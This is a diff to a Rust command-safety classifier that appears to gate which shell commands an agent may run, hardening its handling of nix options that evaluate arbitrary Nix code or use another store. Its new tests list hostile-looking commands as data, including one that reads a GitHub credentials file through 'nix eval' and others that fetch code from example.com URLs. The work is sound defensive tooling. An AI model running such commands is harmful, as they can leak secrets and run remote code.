@@ -2549,9 +2549,9 @@ fn rule(ctx: &mut Ctx, prog: &str, args: &[Arg]) -> Result<Vec<Use>, String> {
             let p = getopt(
                 args,
                 &Spec {
-                    sv: "pfA",
+                    sv: "pA",
                     sf: "qasPc",
-                    lv: &["profile", "file", "attr"],
+                    lv: &["profile", "attr"],
                     lf: &[
                         "query",
                         "installed",
@@ -3875,22 +3875,24 @@ fn resolvectl(args: &[Arg]) -> Result<Vec<Use>, String> {
 }
 
 fn nix(args: &[Arg]) -> Result<Vec<Use>, String> {
+    // Nix code from a file, a URL or standard input (-f -), from a search
+    // path (-I), in --arg values, or evaluated --impure can read any file and
+    // fetch any URL; --store can create a store anywhere.
+    for a in args {
+        let name = a.text.split('=').next().unwrap_or("");
+        let short = name.starts_with('-') && !name.starts_with("--") && name.contains(['f', 'I']);
+        if short || matches!(name, "--file" | "--include" | "--arg" | "--argstr" | "--impure" | "--override-input") {
+            return Err("It evaluates Nix code that can read any of your files.".into());
+        }
+        if matches!(name, "--store" | "--eval-store") {
+            return Err("It uses another Nix store, which can create one.".into());
+        }
+    }
     let p = getopt(
         args,
         &Spec {
-            sv: "fI",
             sf: "rSshLvl",
-            lv: &[
-                "file",
-                "extra-experimental-features",
-                "experimental-features",
-                "include",
-                "store",
-                "override-input",
-                "arg",
-                "argstr",
-                "system",
-            ],
+            lv: &["extra-experimental-features", "experimental-features", "system"],
             lf: &[
                 "json",
                 "raw",
@@ -3906,7 +3908,6 @@ fn nix(args: &[Arg]) -> Result<Vec<Use>, String> {
                 "refresh",
                 "no-update-lock-file",
                 "no-write-lock-file",
-                "impure",
                 "print-build-logs",
                 "quiet",
                 "verbose",
@@ -3939,12 +3940,6 @@ fn nix(args: &[Arg]) -> Result<Vec<Use>, String> {
             e
         }
     })?;
-    let files: Vec<Arg> = p
-        .opts
-        .iter()
-        .filter(|o| matches!(o.name.as_str(), "-f" | "--file"))
-        .filter_map(|o| o.value.as_deref().map(Arg::literal))
-        .collect();
     let pos: Vec<&str> = p.pos.iter().map(|a| a.text.as_str()).collect();
     let ok = match pos.as_slice() {
         [] => p.has(&["--version", "--help"]),
@@ -3962,7 +3957,7 @@ fn nix(args: &[Arg]) -> Result<Vec<Use>, String> {
         _ => false,
     };
     if ok {
-        Ok(uses(&files, Access::Content))
+        Ok(Vec::new())
     } else if matches!(pos.as_slice(), ["store", "verify", ..] | ["store", "repair", ..]) {
         Err("It checks the whole Nix store, which takes a long time.".into())
     } else {
@@ -5456,6 +5451,19 @@ mod tests {
             ("nixos-rebuild switch", "ask"),
             ("nix-env -iA nixpkgs.hello", "ask"),
             ("nix-env -e hello", "ask"),
+            // Nix code that can read any file and fetch any URL.
+            ("nix eval -f https://example.com/x.tar.gz x", "ask"),
+            ("echo 'builtins.readFile /home/alice/.config/gh/hosts.yml' | nix eval -f -", "ask"),
+            ("nix eval --file=/tmp/x.nix x", "ask"),
+            ("nix eval --raw -f '<nixpkgs>' hello.version", "ask"),
+            ("nix eval --impure github:example/flake#x", "ask"),
+            ("nix eval -I nixpkgs=https://example.com/x.tar.gz --raw nixpkgs#hello", "ask"),
+            ("nix eval --arg overlays '[]' nixpkgs#hello", "ask"),
+            ("nix eval --override-input nixpkgs github:example/x nixpkgs#hello", "ask"),
+            ("nix-env -qaf https://example.com/x.tar.gz", "ask"),
+            ("nix-env -q -f /tmp/x.nix", "ask"),
+            ("nix path-info --store /home/alice/x /nix/store/x", "ask"),
+            ("nix store ls --store=ssh://example.com /nix/store/x", "ask"),
             ("aizomectl input click left", "ask"),
             ("aizomectl action toggle-overview", "ask"),
             ("aizomectl recovery restart-shell", "ask"),
